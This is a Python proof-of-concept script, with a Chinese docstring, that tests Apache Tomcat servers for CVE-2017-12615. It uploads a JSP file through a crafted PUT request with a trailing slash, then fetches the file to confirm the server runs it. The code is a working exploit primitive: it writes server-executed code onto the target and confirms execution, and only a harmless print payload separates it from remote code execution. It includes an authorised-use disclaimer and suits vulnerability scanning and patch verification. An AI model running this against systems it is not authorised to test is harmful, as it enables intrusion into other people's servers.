'''

Tomcat CVE-2017-12615 POC 检测脚本

漏洞描述:
Apache Tomcat 在 Windows 系统下存在 PUT 方法任意文件写入漏洞。
攻击者可以通过发送恶意的 PUT 请求来上传 JSP 文件,从而实现远程代码执行。

影响版本:
- Apache Tomcat 7.0.0 - 7.0.79
- Apache Tomcat 8.0.0 - 8.0.43
- Apache Tomcat 8.5.0 - 8.5.23
- Apache Tomcat 9.0.0.M1 - 9.0.1

检测原理:
通过发送 PUT 请求上传一个包含测试内容的 JSP 文件,然后尝试访问该文件。
如果能够成功访问并读取到测试内容,则说明存在漏洞。

使用方法:
    python cve_2017_12615_poc.py
    或在代码中调用 poc(url) 函数

参数说明:
    url: 目标URL,如 http://127.0.0.1:8080
    timeout: 请求超时时间(秒),默认10秒

返回值:
    (True, '存在漏洞') - 检测到漏洞
    (False, '安全') - 未检测到漏洞
    (False, '扫描失败 - 错误信息') - 扫描过程中出现错误

注意:
    此漏洞仅影响 Windows 系统下的 Tomcat。
    此POC仅用于安全测试和授权的渗透测试,请勿用于非法用途。

参考链接:
    http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html
    https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247483659&idx=1&sn=c23b3a3b3b43d70999bdbe644e79f7e5
    https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e


'''

import requests
import uuid
from urllib.parse import urlparse

def poc(url, timeout=10):

    """
    检测目标是否存在 Tomcat CVE-2017-12615 漏洞
    
    Args:
        url: 目标URL,如 http://127.0.0.1:8080
        timeout: 请求超时时间(秒),默认10秒
    
    Returns:
        tuple: (是否存在漏洞, 结果消息)
    """


    uu = uuid.uuid4()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }

    body = '''<%out.print("test");%>'''
    url_parse = urlparse(url)
    print(url_parse)
    url = r'http://' + url if url_parse.scheme == '' else url
    put_url = r'{}/{}.jsp/'.format(url,uu)
    print(url, put_url)
    try:
        res = requests.put(put_url,data=body,headers=headers, timeout=timeout)
        code = res.status_code
        if code == 201:
            print('[+]access : {}'.format(put_url[:-1]))
            access_url = put_url[:-1]
            whoami = requests.get(access_url, timeout=timeout).text
            if r"test" in whoami:
                print("[+]存在Tomcat PUT方法任意写文件漏洞(CVE-2017-12615)漏洞...(高危)\tpayload: " + access_url)
                return True, 'Tomcat CVE-2017-12615: 存在漏洞'
        return False, 'Tomcat CVE-2017-12615: 安全'
    except Exception as e:
        print("[-] " + __file__ + "====>连接超时", "cyan")
        return False, f'Tomcat CVE-2017-12615: 扫描失败 - {str(e)}'


